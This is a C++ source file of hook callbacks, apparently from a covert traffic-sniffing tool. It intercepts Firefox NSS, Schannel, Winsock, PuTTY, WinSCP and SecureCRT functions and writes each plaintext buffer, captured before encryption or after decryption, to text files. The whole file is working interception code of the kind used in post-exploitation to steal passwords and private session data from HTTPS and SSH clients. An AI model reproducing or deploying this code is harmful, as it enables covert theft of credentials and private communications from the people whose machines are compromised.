
#include "stdafx.h"
#include "HookedFunctions.h"

// Variables (function pointers)

PR_Write_Typedef PR_Write_Original;
PR_Read_Typedef PR_Read_Original;
PR_GetDescType_Typedef PR_GetDescType_Original;

SSL_Read_Typedef SSL_Read_Original;
SSL_Write_Typedef SSL_Write_Original;

PR_Send_Typedef PR_Send_Original;
PR_Recv_Typedef PR_Recv_Original;

SSH_Pktsend_Typedef SSH_Pktsend_Original;
SSH_Rdpkt_Typedef SSH_Rdpkt_Original;

SslEncryptPacket_Typedef SslEncryptPacket_Original;
SslDecryptPacket_Typedef SslDecryptPacket_Original;

send_Typedef send_Original;
recv_Typedef recv_Original;

WSASend_Typedef WSASend_Original;
WSARecv_Typedef WSARecv_Original;

EncryptMessage_Typedef EncryptMessage_Original;
DecryptMessage_Typedef DecryptMessage_Original;

PuttySend_Typedef PuttySend_Original;
PuttyRecv_Typedef PuttyRecv_Original;

SecureCRT_Typedef SecureCRT_Original;

// PR_Write callback

int PR_Write_Callback(void *fd, void *buffer, DWORD amount)
{
	LONG res;

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		// Check if this is traffic

		if( (PR_GetDescType_Original(fd) == 2 || PR_GetDescType_Original(fd) == 4) && buffer != NULL) 
		{
				PluginSystem::ProcessAndSaveWrite("PR_Write.txt", (unsigned char *)buffer, amount);
		}
	}

	// Call original function

	res = PR_Write_Original(fd, buffer, amount);

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)PR_Write_Callback);

	return res;
}

// PR_Read callback

int PR_Read_Callback(void *fd, void *buffer, DWORD amount)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	signed int ret = PR_Read_Original(fd, buffer, amount);

	// Do things

	if(bFlag == FALSE)
	{
		if((PR_GetDescType_Original(fd) == 2 || PR_GetDescType_Original(fd) == 4) && ret > 0)
			PluginSystem::ProcessAndSaveRead("PR_Read.txt", (unsigned char *)buffer, ret);
	}

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)PR_Read_Callback);

	return ret;
}

// SSL_Write callback

int SSL_Write_Callback(void *fd, void *buffer, DWORD amount)
{
	LONG res;

	// If allowed

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		PluginSystem::ProcessAndSaveWrite("SSL_Write.txt", (unsigned char *)buffer, amount);
	}

	// Call original function
	
	res = SSL_Write_Original(fd, buffer, amount);

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)SSL_Write_Callback);

	return res;
}

// SSL_Read callback

int SSL_Read_Callback(void *fd, void *buffer, DWORD amount)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	signed int ret = SSL_Read_Original(fd, buffer, amount);

	// Do things

	if(bFlag == FALSE)
	{
		if(ret > 0)
			PluginSystem::ProcessAndSaveRead("SSL_Read.txt", (unsigned char *)buffer, ret);
	}

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)SSL_Read_Callback);

	return ret;
}

// PR_Send callback

int PR_Send_Callback(void *fd, const void *buf, int amount, int flags, DWORD timeout)
{
	LONG res;

	// Do things

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(buf != NULL && amount > 0)
		{
			PluginSystem::ProcessAndSaveWrite("PR_Send.txt", (unsigned char *)buf, amount);
		}
	}

	// Call original function

	res = PR_Send_Original(fd, buf, amount, flags, timeout);

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)PR_Send_Callback);

	return res;
}

// PR_Recv callback

int PR_Recv_Callback(void *fd, void *buf, int amount, int flags, DWORD timeout)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	signed int ret = PR_Recv_Original(fd, buf, amount, flags, timeout);

	// Do things

	if(bFlag == FALSE)
	{
		if(ret > 0)
			PluginSystem::ProcessAndSaveRead("PR_Recv.txt", (unsigned char *)buf, ret);
	}

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)PR_Recv_Callback);

	return ret;
}

// SslEncryptPacket

LONG __stdcall SslEncryptPacket_Callback(ULONG_PTR hSslProvider, ULONG_PTR hKey, PBYTE *pbInput, DWORD cbInput, PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, ULONGLONG SequenceNumber, DWORD dwContentType, DWORD dwFlags)
{
	LONG res;

	// Do things

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(pbInput != NULL && cbInput > 0) 
		{
			PluginSystem::ProcessAndSaveWrite("SslEncryptPacket.txt", (unsigned char *)pbInput, cbInput);
		}
	}

	// Call original function

	res = SslEncryptPacket_Original(hSslProvider, hKey, pbInput, cbInput, pbOutput, cbOutput, pcbResult, SequenceNumber, dwContentType, dwFlags);

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)SslEncryptPacket_Callback);

	return res;
}

// SslDecryptPacket

LONG __stdcall SslDecryptPacket_Callback(ULONG_PTR hSslProvider, ULONG_PTR hKey, PBYTE *pbInput, DWORD cbInput,
	PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, ULONGLONG SequenceNumber, DWORD dwFlags)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	LONG res = SslDecryptPacket_Original(hSslProvider, hKey, pbInput, cbInput, pbOutput, cbOutput, pcbResult, SequenceNumber, dwFlags);

	// Do things

	if(bFlag == FALSE)
	{
		if(pcbResult > 0) 
			PluginSystem::ProcessAndSaveRead("SslDecryptPacket.txt", (unsigned char *)pbOutput, *pcbResult);
	}

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)SslDecryptPacket_Callback);

	return res;
}

// send callback

int __stdcall send_Callback(int s, char *buf, int len, int flags)
{
	LONG res;

	// Do things

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(buf != NULL && len > 0)
		{
			PluginSystem::ProcessAndSaveWrite("send.txt", (unsigned char *)buf, len);
		}
	}

	// Call original function

	res = send_Original(s, buf, len, flags);

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)send_Callback);

	return res;
}

// recv callback

int __stdcall recv_Callback(int s, char *buf, int len, int flags)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	signed int ret = recv_Original(s, buf, len, flags);

	// Do things

	if(bFlag == FALSE)
	{
		if(ret > 0)
			PluginSystem::ProcessAndSaveRead("recv.txt", (unsigned char *)buf, ret);
	}

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)recv_Callback);

	return ret;
}

// WSASend callback

int __stdcall WSASend_Callback(int s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent, 
	DWORD dwFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
{
	int res;

	// Do things

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(lpBuffers != NULL && dwBufferCount > 0)
		{
			for(DWORD i = 0; i < dwBufferCount; i++)
			{
				PluginSystem::ProcessAndSaveWrite("WSASend.txt", (unsigned char *)lpBuffers[i].buf, lpBuffers[i].len);
			}
		}
	}

	// Call original function

	res = WSASend_Original(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped, lpCompletionRoutine);

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)WSASend_Callback);

	return res;
}

// WSARecv callback

int __stdcall WSARecv_Callback(int s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, 
	LPDWORD lpFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	int ret = WSARecv_Original(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);

	// Do things

	if(bFlag == FALSE)
	{
		if(ret == 0)
		{
			for(DWORD i = 0; i < dwBufferCount; i++)
			{
				PluginSystem::ProcessAndSaveRead("WSARecv.txt", (unsigned char *)lpBuffers[i].buf, lpBuffers[i].len);
			}
		}
	}

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)WSARecv_Callback);

	return ret;
}

// EncryptMessage

SECURITY_STATUS __stdcall EncryptMessage_Callback(PCtxtHandle phContext, ULONG fQOP, PSecBufferDesc pMessage, ULONG MessageSeqNo)
{
	SECURITY_STATUS res;

	// Do things

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(pMessage->pBuffers != NULL && pMessage->cBuffers > 0)
		{
			for(DWORD i = 0; i < pMessage->cBuffers; i++)
			{
				SecBuffer buf = pMessage->pBuffers[i];

				if(buf.BufferType == SECBUFFER_DATA) 
					PluginSystem::ProcessAndSaveWrite("EncryptMessage.txt", (unsigned char *)buf.pvBuffer, buf.cbBuffer);
			}
		}
	}

	// Call original function

	res = EncryptMessage_Original(phContext, fQOP, pMessage, MessageSeqNo);

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)EncryptMessage_Callback);

	return res;
}

// DecryptMessage

SECURITY_STATUS __stdcall DecryptMessage_Callback(PCtxtHandle phContext, PSecBufferDesc pMessage, ULONG MessageSeqNo, PULONG pfQOP)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	int ret = DecryptMessage_Original(phContext, pMessage, MessageSeqNo, pfQOP);

	// Do things

	if(bFlag == FALSE)
	{
		if(ret == SEC_E_OK)
		{
			if(pMessage->pBuffers != NULL && pMessage->cBuffers > 0)
			{
				for(DWORD i = 0; i < pMessage->cBuffers; i++)
				{
					SecBuffer buf = pMessage->pBuffers[i];

					if(buf.BufferType == SECBUFFER_DATA) 
						PluginSystem::ProcessAndSaveRead("DecryptMessage.txt", (unsigned char *)buf.pvBuffer, buf.cbBuffer);
				}
			}
		}
	}

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)WSARecv_Callback);

	return ret;
}

// PuttySend callback

void PuttySend_Callback(void *handle, char *buf, int len, int interactive)
{
	// If allowed

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(buf != NULL) PluginSystem::ProcessAndSaveWrite("PuttySend.txt", (unsigned char *)buf, 1);
	}

	// Call original function
	
	PuttySend_Original(handle, buf, len, interactive);

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)PuttySend_Callback);
}

// PuttyRecv callback

int PuttyRecv_Callback(void *term, int is_stderr, const char *data, int len)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	signed int ret = PuttyRecv_Original(term, is_stderr, data, len);

	// Do things

	if(bFlag == FALSE)
	{
		if(data != NULL) PluginSystem::ProcessAndSaveRead("PuttyRecv.txt", (unsigned char *)data, len);
	}

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)PuttyRecv_Callback);

	return ret;
}

// SSH_Pktsend - WinSCP send callback

void SSH_Pktsend_Callback(void *ssh, Packet *pkt)
{
	// If allowed

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(pkt->data != NULL && pkt->length > 0) PluginSystem::ProcessAndSaveWrite("SSH_Pktsend.txt", (unsigned char *)pkt->data, pkt->length);
	}

	// Call original function
	
	SSH_Pktsend_Original(ssh, pkt);

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)SSH_Pktsend_Callback);
}

// SSH_Rdpkt - WinSCP receive callback

Packet* SSH_Rdpkt_Callback(void *ssh, unsigned char **data, int *datalen)
{
	Packet *pkt;

	BOOL bFlag = FunctionFlow::CheckFlag();
	pkt = SSH_Rdpkt_Original(ssh, data, datalen);

	// Do things

	if(bFlag == FALSE && pkt != NULL)
	{
		if(pkt->data != NULL && pkt->length > 0) PluginSystem::ProcessAndSaveRead("SSH_Rdpkt.txt", (unsigned char *)pkt->data, pkt->length);
	}

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)SSH_Rdpkt_Callback);

	return pkt;
}

// SecureCRT_Write callback

int __stdcall SecureCRT_Callback(unsigned char **data, DWORD size)
{
	DWORD ecx_bkp = 0;
	__asm { mov ecx_bkp, ecx };

	// Stuff required to avoid overwriting ECX
	
	unsigned char **temp_data = data;
	DWORD temp_size = size;
	
	BOOL bFlag = FunctionFlow::CheckFlag();

	__asm { mov ecx, ecx_bkp };

	int ret = SecureCRT_Original(temp_data, temp_size);

	// Do things

	if (bFlag == FALSE)
	{
		if (*data != NULL) PluginSystem::ProcessAndSaveRead("SecureCRT.txt", (*data), size);
	}

	FunctionFlow::UnCheckFlag();
	Hooker::RestoreHook((void *)SecureCRT_Callback);

	return ret;
}
